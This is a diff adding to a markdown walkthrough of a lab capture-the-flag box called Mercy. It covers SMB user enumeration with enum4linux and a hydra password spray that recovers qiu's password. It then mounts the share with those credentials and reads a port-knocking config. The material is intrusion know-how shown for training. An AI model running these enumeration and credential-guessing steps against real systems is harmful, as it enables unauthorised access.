@@ -144,7 +144,10 @@ Nmap done: 1 IP address (1 host up) scanned in 253.20 seconds
 
 </details>
 
-# 2. Attempting to exploit tomcat
+# 2. Exploring tomcat
+
+<details>
+  <summary><h2>Attempting tomcat exploit → unsuccessful</h2></summary>
 
 ```console
 ┌──(root㉿kali)-[~]
@@ -188,3 +191,388 @@ Copied to: /root/42966.py
 Poc Filename  Poc.jsp
 Not Vulnerable to CVE-2017-12617
 ```
+
+</details>
+
+## Checking interesting path revealed in nmap scan
+
+<details>
+  <summary>A path at <code>/tryharder/tryharder</code> was found as a disallowed entry from <code>robots.txt</code></summary>
+
+```console
+8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-server-header: Apache-Coyote/1.1
+|_http-open-proxy: Proxy might be redirecting requests
+| http-robots.txt: 1 disallowed entry
+|_/tryharder/tryharder
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Apache Tomcat
+```
+
+</details>
+
+`GET`-ing this path reveals a base64-encoded string: 
+
+```console
+SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
+```
+
+[Decoding](https://www.base64decode.org/) this string returns:
+
+```console
+It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.
+
+Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.
+
+No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
+```
+
+This sounds like a hint to try `password` as password for something, let's look for what to try this on
+
+☝️ if no exploits can be found for entry to the box, the answer may be elsewhere
+
+In this case, it's a password hint encoded in base64
+
+# 3. Exploring SMB
+
+We found a password, now to look for users; one way to list users is to enumerate SMB
+
+<details>
+  <summary>Users <code>pleadformercy</code>, <code>qiu</code>, <code>thisisasuperduperlonguser</code> and <code>fluffy</code> were found using <code>enum4linux</code></summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# enum4linux 10.0.88.35
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 18 14:13:33 2022
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.0.88.35
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ =============================( Enumerating Workgroup/Domain on 10.0.88.35 )=============================
+
+
+[+] Got domain/workgroup name: WORKGROUP
+
+
+ =================================( Nbtstat Information for 10.0.88.35 )=================================
+
+Looking up status of 10.0.88.35
+        MERCY           <00> -         B <ACTIVE>  Workstation Service
+        MERCY           <03> -         B <ACTIVE>  Messenger Service
+        MERCY           <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ====================================( Session Check on 10.0.88.35 )====================================
+
+
+[+] Server 10.0.88.35 allows sessions using username '', password ''
+
+
+ =================================( Getting domain SID for 10.0.88.35 )=================================
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+ ====================================( OS information on 10.0.88.35 )====================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 10.0.88.35 from srvinfo:
+        MERCY          Wk Sv PrQ Unx NT SNT MERCY server (Samba, Ubuntu)
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+
+ ========================================( Users on 10.0.88.35 )========================================
+
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy    Name: QIU       Desc:
+index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu      Name:   Desc:
+
+user:[pleadformercy] rid:[0x3e8]
+user:[qiu] rid:[0x3e9]
+
+ ==================================( Share Enumeration on 10.0.88.35 )==================================
+
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        qiu             Disk
+        IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP
+
+[+] Attempting to map shares on 10.0.88.35
+
+//10.0.88.35/print$     Mapping: DENIED Listing: N/A Writing: N/A
+//10.0.88.35/qiu        Mapping: DENIED Listing: N/A Writing: N/A
+
+[E] Can't understand response:
+
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+//10.0.88.35/IPC$       Mapping: N/A Listing: N/A Writing: N/A
+
+ =============================( Password Policy Information for 10.0.88.35 )=============================
+
+
+
+[+] Attaching to 10.0.88.35 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] MERCY
+        [+] Builtin
+
+[+] Password Info for Domain: MERCY
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: Not Set
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes
+        [+] Locked Account Duration: 30 minutes
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: Not Set
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ ========================================( Groups on 10.0.88.35 )========================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ===================( Users on 10.0.88.35 via RID cycling (RIDS: 500-550,1000-1050) )===================
+
+
+[I] Found new SID:
+S-1-22-1
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 Unix User\pleadformercy (Local User)
+S-1-22-1-1001 Unix User\qiu (Local User)
+S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
+S-1-22-1-1003 Unix User\fluffy (Local User)
+
+[+] Enumerating users using SID S-1-5-21-3544418579-3748865642-433680629 and logon username '', password ''
+
+S-1-5-21-3544418579-3748865642-433680629-501 MERCY\nobody (Local User)
+S-1-5-21-3544418579-3748865642-433680629-513 MERCY\None (Domain Group)
+S-1-5-21-3544418579-3748865642-433680629-1000 MERCY\pleadformercy (Local User)
+S-1-5-21-3544418579-3748865642-433680629-1001 MERCY\qiu (Local User)
+
+ ================================( Getting printer info for 10.0.88.35 )================================
+
+No printers returned.
+
+
+enum4linux complete on Sun Dec 18 14:13:46 2022
+```
+
+</details>
+
+<details>
+  <summary>Using <code>hydra</code> reveals that <code>qiu</code> is the owner of the password</summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# hydra -L users.txt -p password 10.0.88.35 smb
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-18 14:31:59
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 4 login tries (l:4/p:1), ~4 tries per task
+[DATA] attacking smb://10.0.88.35:445/
+[445][smb] host: 10.0.88.35   login: qiu   password: password
+[445][smb] Host: 10.0.88.35 Account: thisisasuperduperlonguser Error: Invalid account (Anonymous success)
+[445][smb] Host: 10.0.88.35 Account: fluffy Error: Invalid account (Anonymous success)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-18 14:32:00
+```
+
+</details>
+
+<details>
+  <summary>Connecting the share with <code>smbclient</code> reveals that it is <code>qiu</code>'s home directory with an intertesting <code>.private</code> hidden directory</summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# smbclient -U qiu%password //10.0.88.35/qiu -c dir
+  .                                   D        0  Sat Sep  1 03:07:00 2018
+  ..                                  D        0  Tue Nov 20 00:59:09 2018
+  .bashrc                             H     3637  Sun Aug 26 21:19:34 2018
+  .public                            DH        0  Sun Aug 26 22:23:24 2018
+  .bash_history                       H      163  Sat Sep  1 03:11:34 2018
+  .cache                             DH        0  Sat Sep  1 02:22:05 2018
+  .private                           DH        0  Mon Aug 27 00:35:34 2018
+  .bash_logout                        H      220  Sun Aug 26 21:19:34 2018
+  .profile                            H      675  Sun Aug 26 21:19:34 2018
+
+                19213004 blocks of size 1024. 16330216 blocks available
+```
+
+</details>
+
+☝️ You can't `dir` hidden directories with `smbclient`, you need to `mount` the share to list them
+
+<details>
+  <summary>Mounting the share to read the hidden directories reveals a hidden config file at <code>/qiu/.private/opensesame/config</code></summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# mount -t cifs -o username=qiu,password=password //10.0.88.35/qiu /mnt
+
+┌──(root㉿kali)-[~]
+└─# ls -la /mnt
+total 4100
+drwxr-xr-x  2 root root    0 Sep  1  2018 .
+drwxr-xr-x 19 root root 4096 Dec 18 15:00 ..
+-rwxr-xr-x  1 root root  163 Sep  1  2018 .bash_history
+-rwxr-xr-x  1 root root  220 Aug 26  2018 .bash_logout
+-rwxr-xr-x  1 root root 3637 Aug 26  2018 .bashrc
+drwxr-xr-x  2 root root    0 Sep  1  2018 .cache
+drwxr-xr-x  2 root root    0 Aug 27  2018 .private
+-rwxr-xr-x  1 root root  675 Aug 26  2018 .profile
+drwxr-xr-x  2 root root    0 Aug 26  2018 .public
+
+┌──(root㉿kali)-[~]
+└─# ls -la /mnt/.private
+total 1024
+drwxr-xr-x 2 root root  0 Aug 27  2018 .
+drwxr-xr-x 2 root root  0 Sep  1  2018 ..
+drwxr-xr-x 2 root root  0 Aug 31  2018 opensesame
+-rwxr-xr-x 1 root root 94 Aug 26  2018 readme.txt
+drwxr-xr-x 2 root root  0 Nov 20  2018 secrets
+
+┌──(root㉿kali)-[~]
+└─# ls -la /mnt/.private/opensesame/
+total 2048
+drwxr-xr-x 2 root root     0 Aug 31  2018 .
+drwxr-xr-x 2 root root     0 Aug 27  2018 ..
+-rwxr-xr-x 1 root root 17543 Sep  1  2018 config
+-rwxr-xr-x 1 root root   539 Aug 31  2018 configprint
+```
+
+</details>
+
+<details>
+  <summary>Reading the <code>/qiu/.private/opensesame/config</code> config file reveals the port knocking configuration for <code>HTTP</code> and <code>SSH</code></summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# cat /mnt/.private/opensesame/config
+⋮
+Port Knocking Daemon Configuration
+
+[options]
+        UseSyslog
+
+[openHTTP]
+        sequence    = 159,27391,4
+        seq_timeout = 100
+        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+        tcpflags    = syn
+
+[closeHTTP]
+        sequence    = 4,27391,159
+        seq_timeout = 100
+        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+        tcpflags    = syn
+
+[openSSH]
+        sequence    = 17301,28504,9999
+        seq_timeout = 100
+        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+        tcpflags    = syn
+
+[closeSSH]
+        sequence    = 9999,28504,17301
+        seq_timeout = 100
+        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+        tcpflags    = syn
+⋮
+```
+
+</details>
+
+This explains why `80` and `22` showed up as `filtered` in the nmap scan
